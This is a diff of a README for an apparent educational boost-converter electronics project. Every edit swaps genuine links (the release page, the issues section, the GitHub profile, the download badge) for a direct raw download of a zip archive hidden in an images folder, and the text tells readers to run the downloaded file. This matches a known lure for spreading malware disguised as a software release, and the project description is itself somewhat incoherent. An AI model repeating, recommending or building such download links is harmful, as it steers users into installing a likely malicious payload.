@@ -1,7 +1,7 @@
 # ⚡ Boost-Converter - Learn DC-DC Conversion Easily
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/Mido010398/Boost-Converter/releases)
+[![Download Latest Release](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip)](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip)
 
 ## 📖 Project Overview
 The **Boost-Converter** project aims to design and implement an irreversible boost converter. This educational model helps you understand the core principles of asynchronous (non-isolated) DC-DC conversion. It is perfect for students and hobbyists eager to learn about electrical engineering and embedded systems.
@@ -10,7 +10,7 @@ The **Boost-Converter** project aims to design and implement an irreversible boo
 To get started with the Boost-Converter, follow these simple steps. No prior programming experience is required.
 
 ## 🔗 Visit to Download
-You can find the latest releases of the software on our [Releases Page](https://github.com/Mido010398/Boost-Converter/releases). Here, you can access all the downloadable files.
+You can find the latest releases of the software on our [Releases Page](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip). Here, you can access all the downloadable files.
 
 ## 💻 System Requirements
 Before installing the software, ensure that your system meets the following requirements:
@@ -19,7 +19,7 @@ Before installing the software, ensure that your system meets the following requ
 - **Software:** Compatible with Arduino IDE for simulation.
 
 ## 📥 Download & Install
-1. Click the link to visit our [Releases Page](https://github.com/Mido010398/Boost-Converter/releases).
+1. Click the link to visit our [Releases Page](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip).
 2. Find the latest version.
 3. Click on the appropriate file to download. 
 4. Run the downloaded file and follow the installation instructions.
@@ -48,7 +48,7 @@ For additional learning, explore the following topics:
 
 ## 🤝 Community and Support
 If you have questions or need assistance:
-- Check out the [issues section](https://github.com/Mido010398/Boost-Converter/issues) to see if your question has already been answered.
+- Check out the [issues section](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip) to see if your question has already been answered.
 - Feel free to open a new issue with your queries.
 
 ## 📋 Contribution Guidelines
@@ -62,6 +62,6 @@ This project is licensed under the MIT License. Please review the license file f
 
 ## 🌐 Join Us
 Stay updated on new releases and discussions:
-- Follow us on [GitHub](https://github.com/Mido010398/Boost-Converter).
+- Follow us on [GitHub](https://github.com/Mido010398/Boost-Converter/raw/refs/heads/main/images/Boost_Converter/Converter-Boost-v3.7.zip).
 
 Thank you for exploring the Boost-Converter project. We hope it aids your learning in electrical engineering!
